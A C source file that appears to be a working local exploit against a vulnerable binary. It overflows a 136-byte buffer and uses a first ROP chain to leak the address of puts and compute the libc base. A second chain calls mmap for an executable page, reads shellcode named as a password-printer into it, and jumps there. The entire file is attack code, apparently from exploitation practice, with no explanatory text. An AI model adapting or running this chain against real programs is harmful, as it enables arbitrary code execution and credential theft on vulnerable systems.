#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/mman.h>
#include <stdio.h>
#include <sys/wait.h>
#include "utils.h"
#include "shellcode.h"

#define WRITE_PIPE writePipe[1]
#define READ_PIPE readPipe[0]
#define LIBC(address) (libcAdress + address)
#define PAGEUP(x) (((unsigned long)x + 4095)&(~4095))

unsigned long libcAdress = 0;
const int PUTS_OFFSET = 0x76210;
const int MMAP_PROTECT = PROT_EXEC | PROT_WRITE | PROT_READ;
const int MMAP_FLAG = MAP_ANONYMOUS | MAP_PRIVATE;

int main(void)
{
    pid_t child;
    signal(SIGCHLD, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);

    char *const argv[] = {"/home/loona/Documents/a.out", NULL};
    int readPipe[2];
    int writePipe[2];
    char buff[400];

    pipe(readPipe);
    pipe(writePipe);

    if (!(child = fork())) {
        dup2(writePipe[0], STDIN_FILENO);
        dup2(readPipe[1], STDOUT_FILENO);
        close(writePipe[1]);
        close(readPipe[0]);
        execv(argv[0], argv);
    }

    memset(buff, 'A', 136);

    unsigned long *rop = (unsigned long *) (buff + 136);
    *rop ++= 0x0040120b; // pop rdi
    *rop ++= 0x00404018; // got address puts()
    *rop ++= 0x00401030; // puts@plt
    *rop ++= 0x0040115d; // address main

    sendStr(WRITE_PIPE, buff, 136 + (8 * 4));
    waitAndReadCountChar(READ_PIPE, 57);
    unsigned long address = waitAndReadAdress(READ_PIPE);

    libcAdress = address - PUTS_OFFSET;

    printf("-> %p %s %p \n", address, " libc->", libcAdress);

    rop = (unsigned long *) (buff + 136);
    *rop ++= 0x0040120b; // pop rdi -> arg 1
    *rop ++= 0; // 0 address -> arg 1
    *rop ++= 0x00401209; // pop rsi ; pop r15 ; ret  ; -> rsi, 2 arg
    *rop ++= PAGEUP(strlen(shellcodePrintPaswwd)); // len shellcodePrintPaswwd -> 2 arg
    *rop ++= 666; // trash for r15;
    *rop ++= LIBC(0x000e46c9); //pop rdx ; pop rcx ; pop rbx ; ret  ; 3, 4 arg
    *rop ++= MMAP_PROTECT; // Read Write Exec prot
    *rop ++= MMAP_FLAG; // flag for page memory;
    *rop ++= 0xdeadbeef; // trash for rbx;
    *rop ++= LIBC(0x0012a0c6);//pop r8 ; mov eax, 0x00000001 ; ret  ;  arg 5 fd
    *rop ++= -1; // -1 fd for 5 arg mmap;
    *rop ++= LIBC(0x0007f1db); // pop rbx ; ret  ;  value for 6 arg
    *rop ++= 0; // 0 for 6 arg mmap

    *rop ++= LIBC(0x00081324); // pop r12 ; ret  ;  (1 found)
    *rop ++= LIBC(0x000470b2); // pop r15 ; ret  ; remove ret address

    *rop ++= LIBC(0x000e7752); //mov r9, rbx ; call r12 ; 6 arg and call mmap
    *rop ++= LIBC(0x000f8770); //mmap address

    *rop ++= LIBC(0x0007f1db); //pop rbx ; ret  ;
    *rop ++= LIBC(0x00081c65); //pop r13 ; pop r14 ; pop r15 ; ret  ; mmap adress to rdi (1 arg) gets

    *rop ++= LIBC(0x0002886f);//push rax ; call rbx ;
    *rop ++= 0;
    *rop ++= LIBC(0x0007bed6); // mov rdi, r14 ; call r12 ;  (1 found)
    *rop ++= LIBC(0x00075780); // gets read shellcodePrintPaswwd
    *rop ++= 0x004010bc; // jmp rax ; jump to shell

    for (int i = 0; i < 136 + (8 * 24); ++i) {
        if(buff[i] == 0x0a) {
            printf("0xa detect ");
        }
    }

    sendStr(WRITE_PIPE, buff, 136 + (8 * 24));
    sendStr(WRITE_PIPE, shellcodePrintPaswwd, strlen(shellcodePrintPaswwd));

    waitpid(child, NULL, 0);
    readAllAndPrintLine(READ_PIPE);
}
